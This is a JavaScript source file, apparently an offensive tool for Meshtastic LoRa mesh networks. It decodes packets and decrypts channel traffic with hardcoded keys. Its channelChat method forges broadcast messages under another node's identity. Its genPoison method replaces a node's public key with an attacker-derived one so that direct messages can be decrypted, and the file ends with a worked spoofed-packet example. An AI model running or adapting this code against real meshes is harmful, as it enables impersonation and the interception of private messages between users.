
import { randomBytes } from '@noble/ciphers/webcrypto.js'
import { ctr } from '@noble/ciphers/aes.js'
import {fromBinary, toBinary} from '@bufbuild/protobuf'
import * as protobufs from '@meshtastic/protobufs'
import { UINT32_MAX } from '@bufbuild/protobuf/wire'

import { ed25519, x25519 } from '@noble/curves/ed25519.js'
import hkdf from '@panva/hkdf'


const OUTBOUND_CHANNELS = {
  minutemesh: base64ToArrayBuffer('1PG7OiApB1nwvP+rz05p5Q==')
}

const CHANNELS = {
  Default: new Uint8Array(32),
  Default2: new Uint8Array([
    0xd4, 0xf1, 0xbb, 0x3a, 0x20, 0x29, 0x07, 0x59,
    0xf0, 0xbc, 0xff, 0xab, 0xcf, 0x4e, 0x69, 0x01
  ]),
  minutemesh: base64ToArrayBuffer('1PG7OiApB1nwvP+rz05p5Q==')
}

export const PortNumToProtoBuf = {
  0: null, //binary - unknown packet format
  1: null, // utf-8 - chat message
  2: protobufs.Mesh.NodeRemoteHardwarePinSchema,
  3: protobufs.Mesh.PositionSchema,
  4: protobufs.Mesh.UserSchema,
  5: protobufs.Mesh.RoutingSchema,
  6: protobufs.Admin.AdminMessageSchema,
  7: null, //Unishox2 Compressed utf-8
  8: protobufs.Mesh.WaypointSchema,
  9: null, //codec2 packets
  10: null,
  12: protobufs.Mesh.KeyVerificationSchema,
  // 'ping' - replies to all packets.
  // type - char[]
  32: null, 
  // send and receive telemetry data
  // type - Protobuf
  67: null, //Telemetry
  70: null, //traceroute
  73: null  //Map report
}

function tryDecryptChannelPacket(pkt, channel_key, extraNonce=null){

  if(extraNonce == null){
    extraNonce = new DataView( new ArrayBuffer(4) )
    extraNonce.setUint32(0, 0)
  } else {
    extraNonce = new DataView( extraNonce.buffer )
  }

  let view = new DataView(pkt.buffer)
  const nonce = new ArrayBuffer(16)
  const nonceView = new DataView(nonce)

  nonceView.setUint32( 0, view.getUint32(8) ) // packetid - first 8bytes of nonce
  nonceView.setUint32( 8, view.getUint32(4) ) // fromNode - 4bytes
  nonceView.setUint32( 12, extraNonce.getUint32(0) )                // extraNonce - 4bytes - set to all 0x0 if not included


  try{
    const plaintext = ctr(channel_key, new Uint8Array(nonceView.buffer)).decrypt( pkt.slice(16) )
    let payload = fromBinary(protobufs.Mesh.DataSchema, plaintext)

    return payload
  } catch (err){
    return null
  }

}

function initNonce(from, packetId=null, extraNonce=null){
  let extraNonceView
  if(extraNonce == null){
    extraNonceView = new DataView( new ArrayBuffer(4) )
    extraNonceView.setUint32(0, 0)
  } else {
    extraNonceView = new DataView( extraNonce.buffer )
  }

  if(packetId == null){ packetId = randomBytes(4) }
  const packetIdView = new DataView(packetId.buffer)

  const nonce = new ArrayBuffer(16)
  const nonceView = new DataView(nonce)
  const fromView = new DataView(from.buffer)

  nonceView.setUint32( 0, packetIdView.getUint32(0) )
  if(packetId.length == 8){
    nonceView.setUint32( 4, packetIdView.getUint32(4) )
  }
  nonceView.setUint32( 8, fromView.getUint32(0) )
  nonceView.setUint32( 12, extraNonceView.getUint32(0))

  return new Uint8Array(nonceView.buffer)
}

function encryptChannelPacket(channel_key, payload, from, packetId=null, extraNonce=null){

  const nonce = initNonce(from, packetId, extraNonce)

  const ciphertext = ctr(channel_key, nonce).encrypt(payload)
  return ciphertext
}

function uint32ToUint8Array(num) {
  const buffer = new ArrayBuffer(4); // 4 bytes for a uint32
  const view = new DataView(buffer);
  view.setUint32(0, num); // true for little-endian, false for big-endian
  return new Uint8Array(buffer);
}

function base64ToArrayBuffer(base64) {
    var binaryString = atob(base64);
    var bytes = new Uint8Array(binaryString.length);
    for (var i = 0; i < binaryString.length; i++) {
        bytes[i] = binaryString.charCodeAt(i);
    }
    return new Uint8Array(bytes.buffer);
}

export class LorapipeRawPacket {

  /**
   * 
   * @param {Number} seen timestamp 
   * @param {Number} rssi 
   * @param {Number} snr 
   * @param {Uint8Array} raw 
   */
  constructor(seen, rssi, snr, raw, channels=CHANNELS){
    this.meta = { seen, rssi, snr }

    this.header = { }

    this.parsed = {}

    this.marauderKey = null

    if(raw.length == 0) {throw new Error('packet empty') }

    this.short = false
    let view = new DataView(raw.buffer)

    if(raw.length >= 4) { this.header.to = view.getUint32(0) } else {this.short=true}
    if(raw.length >= 8) { this.header.from = view.getUint32(4) } else {this.short=true}
    if(raw.length >= 12) { this.header.id = view.getUint32(8) } else {this.short=true}
    if(raw.length >= 13) { 
      this.header.flagsByte = view.getUint8(12)
      //console.log("FLAGS BYTE: " + this.header.flagsByte)
      this.header.flags = {
        hop_limit: this.header.flagsByte & 0x7,
        want_ack: (this.header.flagsByte & 0x8) >> 3,
        via_mqtt: (this.header.flagsByte & 0x10) >> 4,
        hop_start:(this.header.flagsByte & 0xE0) >> 5
      }
    } else {this.short=true}
    if(raw.length >= 14) { this.header.channel = view.getUint8(13) } else {this.short=true}
    if(raw.length >= 15) { this.header.next_hop = view.getUint8(14) } else {this.short=true}
    if(raw.length >= 16) { this.header.relay_node = view.getUint8(15) } else {this.short=true}

    if(this.header.to != UINT32_MAX){
      this.parsed.is_dm = true
    } else {
      this.parsed.is_broadcast = true
    }

    this.parsePayload(raw, channels)
  }

  parsePayload(raw, channels) {
    if(!this.short){

      try {
        this.parsed.data = fromBinary(protobufs.Mesh.DataSchema, raw.slice(16))
        this.parsed.encrypted = false
        this.parsed.decoded = false
      } catch (err) {
        //encrypted 
        this.parsed.encrypted = true
        this.parsed.decrypted = false
        this.parsed.decoded = false
      }

      if(this.parsed.encrypted){
        let key = null
        let data = tryDecryptChannelPacket(raw, channels.minutemesh); key ='minutemesh'
      
        
        if(data){ 
          this.parsed.channel = key
          this.parsed.decrypted = true
          this.parsed.data = data
        } else {
          this.raw = raw
        }

      }

    }


    if(this.parsed.data && this.parsed.data.portnum != 0){

      let scheme = PortNumToProtoBuf[ this.parsed.data.portnum ]

      if(scheme != null && scheme != undefined){

        this.parsed.content = fromBinary(scheme, this.parsed.data.payload)
        delete this.parsed.data.payload
        this.parsed.decoded = true
      } else if(this.parsed.data.portnum == 1) {
        this.parsed.content = this.parsed.data.payload

        //console.log(this.parsed.data)
        console.log(new Date(this.meta.seen), this.header.from, this.parsed.channel, '-', new TextDecoder().decode(this.parsed.content))

        delete this.parsed.data.payload
        this.parsed.decoded = true
      }
    }
  }

  async channelChat(key, text){
    let rawPayload = toBinary(protobufs.Mesh.DataSchema,
      {  '$typeName': 'meshtastic.Data',
        portnum: 1,
        payload: new TextEncoder().encode(text),
        wantResponse: false,
        //dest: 0,
        //source: 0,
        //requestId: 0,
        //replyId: 0,
        //emoji: 0,
        //bitfield: 0
      }
    )

      

    let ppacketId = randomBytes(4)
    const ppacketIdView = new DataView(ppacketId.buffer)

    let encPayload = encryptChannelPacket(
      OUTBOUND_CHANNELS[key] ? OUTBOUND_CHANNELS[key] : OUTBOUND_CHANNELS.DEFCONnect,
      rawPayload,
      uint32ToUint8Array(this.header.from),
      ppacketId
    )

    let forgedPkt = new DataView( new ArrayBuffer(encPayload.byteLength + 16) )

    for(let i=0; i<encPayload.byteLength; i++){
      let val = encPayload.at(i)
      forgedPkt.setUint8(i+16, val)
    }

    forgedPkt.setUint32(0, UINT32_MAX)

    let flags = (
      (0xff & 0x7) |
      (this.header.flagsByte & 0x8) |
      (this.header.flagsByte & 0x10) |  // mqtt
      (0xff  & 0xE0)
    )

    
    forgedPkt.setUint32(4, this.header.from)
    forgedPkt.setUint32(8, ppacketIdView.getUint32(0))
    forgedPkt.setUint8(12, flags)
    forgedPkt.setUint8(13, this.header.channel)
    forgedPkt.setUint8(14, this.header.next_hop)
    forgedPkt.setUint8(15, this.header.relay_node)


    return forgedPkt.buffer
  }

  async decryptDM(messagePkt, fromUser){
    await this.genKey()

    console.log(messagePkt)

    await tryDecryptDM(messagePkt, this, fromUser)
    
  }

  async genKey(){
    if(this.marauderKey != null){ return this.marauderKey }

    let seed = await hkdf('sha512', this.parsed.content.macaddr, new Uint8Array(32), 'meshmarauder', 32)

    const theKey = x25519.keygen(seed)
    this.marauderKey = theKey
    return theKey
  }

  async genPoison(){
    let { publicKey } = await this.genKey()
    this.parsed.content.publicKey = publicKey

    if(this.parsed.content.longName.indexOf('🥷') == -1){
      this.parsed.content.longName = this.parsed.content.longName + '🥷'
    }

    let scheme = PortNumToProtoBuf[ this.parsed.data.portnum ]

    if(scheme != null && !this.short && this.parsed.decoded == true){

      this.parsed.data.payload = toBinary( protobufs.Mesh.UserSchema, this.parsed.content  )

      let rawPayload = toBinary(protobufs.Mesh.DataSchema, this.parsed.data)

      let ppacketId = randomBytes(4)
      const ppacketIdView = new DataView(ppacketId.buffer)

        let encPayload = encryptChannelPacket(
            OUTBOUND_CHANNELS[this.parsed.channel] || OUTBOUND_CHANNELS.DEFCONnect,
            rawPayload,
            uint32ToUint8Array(this.header.from),
            ppacketId
        )

        let poisonPkt = new DataView( new ArrayBuffer(encPayload.byteLength + 16) )

        for(let i=0; i<encPayload.byteLength; i++){
            let val = encPayload.at(i)
            poisonPkt.setUint8(i+16, val)
        }
        poisonPkt.setUint32(0, this.header.to)

/*
      hop_limit: this.header.flagsByte & 0x7,
      want_ack: (this.header.flagsByte & 0x8) >> 3,
      via_mqtt: (this.header.flagsByte & 0x10) >> 4,
      hop_start:(this.header.flagsByte & 0xE0) >> 5 */

      let flags = (
        (0xff & 0x7) |                    // hop_limit
        (this.header.flagsByte & 0x8) |   // want_ack
        (this.header.flagsByte & 0x10) |  // via_mqtt
        (0xff  & 0xE0)                    // hop_start
      )

      
      poisonPkt.setUint32(4, this.header.from)
      poisonPkt.setUint32(8, ppacketIdView.getUint32(0))
      poisonPkt.setUint8(12, flags)
      poisonPkt.setUint8(13, this.header.channel)
      poisonPkt.setUint8(14, this.header.next_hop)
      poisonPkt.setUint8(15, this.header.relay_node)


      return poisonPkt.buffer

    }

  }


  toObject(){
    return {
      meta:this.meta,
      header: this.header,
      parsed: this.parsed,
      short: this.short
    }
  }

}

// --- Simple packet builder helpers (use these to craft outgoing packets) ---
function makePacketId() {
  return randomBytes(4);
}

function packFlagsByte({ hop_limit = 7, want_ack = true, via_mqtt = false, hop_start = 0 } = {}) {
  const hl = (hop_limit & 0x7);
  const wa = want_ack ? 1 : 0;
  const vm = via_mqtt ? 1 : 0;
  const hs = (hop_start & 0x7);
  return (hs << 5) | (vm << 4) | (wa << 3) | hl;
}

/**
 * Build a wire packet (Uint8Array) ready to send or re-parse with LorapipeRawPacket.
 * opts.dataObj should be a Mesh.DataSchema-compatible JS object; for text use portnum=1 and payload=Uint8Array
 */
export function buildWirePacket(opts) {
  const {
    to = UINT32_MAX,
    from = 0,
    packetId = makePacketId(),
    flags = {},
    channel = 0xFB,
    next_hop = 0, // this doesn't fix the -1
    relay_node = 0,
    dataObj,
    channelKey = OUTBOUND_CHANNELS.minutemesh
  } = opts;

  if (!dataObj) throw new Error('dataObj required');

  const rawPayload = toBinary(protobufs.Mesh.DataSchema, dataObj);

  const encPayload = encryptChannelPacket(channelKey, rawPayload, uint32ToUint8Array(from), packetId);

  const buf = new ArrayBuffer(16 + encPayload.byteLength);
  const view = new DataView(buf);

  view.setUint32(0, to);
  view.setUint32(4, from);
  // packetId is a Uint8Array length 4
  const pid = packetId instanceof Uint8Array ? packetId : new Uint8Array(packetId);
  const pidView = new DataView(pid.buffer, pid.byteOffset ?? 0, 4);
  view.setUint32(8, pidView.getUint32(0));

  view.setUint8(12, packFlagsByte(flags));
  view.setUint8(13, channel & 0xFF);
  view.setUint8(14, next_hop & 0xFF);
  view.setUint8(15, relay_node & 0xFF);

  const out = new Uint8Array(buf);
  out.set(new Uint8Array(encPayload.buffer, encPayload.byteOffset ?? 0, encPayload.byteLength), 16);
  return out;
}

// Example (commented):
const dataObj = { $typeName: 'meshtastic.Data', portnum: 1, payload: new TextEncoder().encode('this is NOT a legitimate message'), wantResponse: false };
const pkt = buildWirePacket({ from: 0xC96ED214, dataObj });
console.log('Built packet:', pkt);
// print hex of packet
console.log(Array.from(pkt).map(b => b.toString(16).padStart(2, '0')).join(''));

const parsed = new LorapipeRawPacket(Date.now(), -40, 6, pkt);

// print decrypted content
console.log(parsed);